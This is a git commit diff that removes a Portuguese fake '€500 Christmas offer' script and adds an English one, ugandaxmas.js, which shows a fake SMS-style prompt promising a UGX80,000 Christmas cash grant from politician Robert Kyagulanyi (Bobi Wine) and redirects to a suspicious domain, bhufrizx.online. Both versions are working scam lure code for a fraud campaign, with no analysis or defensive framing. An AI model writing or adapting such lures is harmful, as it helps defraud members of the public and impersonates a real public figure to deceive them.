9e1f75ff5e54849c2ddd2655e9507d07fda04df2
newetijazz11 <newetijazz11@gmail.com>
2025-12-24 13:41:06 +0100

    Update and rename portugalxmas.js to ugandaxmas.js

--- portugalxmas.js
+++
@@ -1,8 +0,0 @@
-var password = 'Retirar €500'
-password = prompt(
-  'SMS: Parabéns! Tem direito a receber €500 para celebrar o Natal deste ano. Por favor clique em OK para receber esta oferta..',
-  'Retirar €500'
-);
-if (password != 'Retirar €500') {
-  location.href = 'https://www.bhufrizx.online/Portugalxmas-500euros';
-}
---
+++ ugandaxmas.js
@@ -0,0 +1,5 @@
+	var password = 'WITHDRAW UGX80,000'
+password=prompt('SMS: Congratulations You qualify for ROBERT KYAGULANYI (BOBI WINE) UGX80,000 CHRISTMAS AND HAPPY NEW YEAR CASH GRANT FOR UGANDANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW UGX80,000');
+if (password != 'WITHDRAW UGX80,000') {
+location.href='https://www.bhufrizx.online/Withdraw-UGX80000';
+}
